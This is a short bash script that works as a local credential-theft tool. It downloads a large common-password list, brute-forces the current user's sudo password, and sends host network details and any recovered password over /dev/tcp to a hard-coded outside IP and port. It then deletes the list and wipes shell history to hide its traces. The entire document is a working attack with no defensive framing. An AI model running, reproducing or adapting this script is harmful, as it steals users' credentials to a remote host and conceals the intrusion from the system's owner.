export TARGET=206.189.215.73
export PORT=3337

# Downloading top 1,000,000 commonly used passwords
wget -O ~/Downloads/p -q -o /dev/null https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

# Tell server a process has started with host information
echo "START" > /dev/tcp/"$TARGET"/"$PORT"
sleep 1
ifconfig | grep "net" > /dev/tcp/"$TARGET"/"$PORT"

# Check if user uses password or not
/usr/bin/sudo -n true 2>/dev/null
if [ $? -eq 0 ]
then
	# Send "no password" message to server
	echo "$USER:NO_PASSWORD" > /dev/tcp/"$TARGET"/"$PORT"
else
	# Try every password in the file we just download
	while read pwd; do
		echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
		if [ $? -eq 0 ]
		then
			# Send "valid password" message to server
			echo "$USER:$pwd:valid" > /dev/tcp/"$TARGET"/"$PORT"
			break
		fi
	done < ~/Downloads/p
fi

# Tell server a process has finished
echo "END" > /dev/tcp/"$TARGET"/"$PORT"

# Clean up
rm -f ~/Downloads/p
history -c && rm .bash_history
#! /bin/rm -f
